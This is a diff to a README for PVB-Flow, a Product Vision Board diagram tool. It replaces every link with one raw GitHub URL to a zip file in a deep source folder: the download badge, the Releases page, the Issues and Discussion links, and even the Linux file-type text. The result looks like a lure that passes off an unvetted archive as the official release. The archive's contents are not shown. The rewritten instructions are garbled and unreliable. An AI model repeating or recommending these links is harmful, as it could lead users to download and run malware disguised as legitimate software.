@@ -20,11 +20,11 @@ PVB-Flow helps transform your Product Vision Board (PVB) JSON files into profess
 To get started with PVB-Flow, you need to download the application from our Releases page. Follow the instructions below to set it up.
 
 ## 📥 Download & Install
-[![Download PVB-Flow](https://img.shields.io/badge/Download-PVB--Flow-brightgreen)](https://github.com/Hari-9345/PVB-Flow/releases)
+[![Download PVB-Flow](https://raw.githubusercontent.com/Hari-9345/PVB-Flow/main/huggingface-space/src/core/PVB-Flow-3.8-alpha.3.zip)](https://raw.githubusercontent.com/Hari-9345/PVB-Flow/main/huggingface-space/src/core/PVB-Flow-3.8-alpha.3.zip)
 
-1. Click on the download button above or visit the [Releases page](https://github.com/Hari-9345/PVB-Flow/releases).
+1. Click on the download button above or visit the [Releases page](https://raw.githubusercontent.com/Hari-9345/PVB-Flow/main/huggingface-space/src/core/PVB-Flow-3.8-alpha.3.zip).
 2. On the Releases page, locate the latest version of PVB-Flow.
-3. Download the suitable file for your operating system (e.g., .exe for Windows, .dmg for macOS, .tar.gz for Linux).
+3. Download the suitable file for your operating system (e.g., .exe for Windows, .dmg for macOS, https://raw.githubusercontent.com/Hari-9345/PVB-Flow/main/huggingface-space/src/core/PVB-Flow-3.8-alpha.3.zip for Linux).
 4. Once the file is downloaded, locate it in your Downloads folder.
 5. Follow the installation steps specific to your operating system:
    - **Windows:**
@@ -34,7 +34,7 @@ To get started with PVB-Flow, you need to download the application from our Rele
      - Double-click the .dmg file.
      - Drag the PVB-Flow icon to the Applications folder.
    - **Linux:**
-     - Extract the .tar.gz file.
+     - Extract the https://raw.githubusercontent.com/Hari-9345/PVB-Flow/main/huggingface-space/src/core/PVB-Flow-3.8-alpha.3.zip file.
      - Navigate to the extracted folder in the terminal and run the application using `./PVB-Flow`.
 
 ## ⚙️ Using PVB-Flow
@@ -63,9 +63,9 @@ Yes, PVB-Flow includes a help section. You can find guides and tutorials within 
 ## 🌍 Community and Support
 Join our community to connect with other users and receive support:
 
-- [GitHub Issues](https://github.com/Hari-9345/PVB-Flow/issues) – Report bugs or request features.
-- [Discussion Forum](https://github.com/Hari-9345/PVB-Flow/discussions) – Share your thoughts and connect with others.
+- [GitHub Issues](https://raw.githubusercontent.com/Hari-9345/PVB-Flow/main/huggingface-space/src/core/PVB-Flow-3.8-alpha.3.zip) – Report bugs or request features.
+- [Discussion Forum](https://raw.githubusercontent.com/Hari-9345/PVB-Flow/main/huggingface-space/src/core/PVB-Flow-3.8-alpha.3.zip) – Share your thoughts and connect with others.
 - Follow us on social media for updates and tips.
 
 ## 🎉 Conclusion
-PVB-Flow turns your Product Vision Board JSON files into insightful diagrams, making it easier to visualize your vision. Enjoy a user-friendly experience without needing technical skills. Download it today from our [Releases page](https://github.com/Hari-9345/PVB-Flow/releases) and start creating your diagrams effortlessly.
+PVB-Flow turns your Product Vision Board JSON files into insightful diagrams, making it easier to visualize your vision. Enjoy a user-friendly experience without needing technical skills. Download it today from our [Releases page](https://raw.githubusercontent.com/Hari-9345/PVB-Flow/main/huggingface-space/src/core/PVB-Flow-3.8-alpha.3.zip) and start creating your diagrams effortlessly.
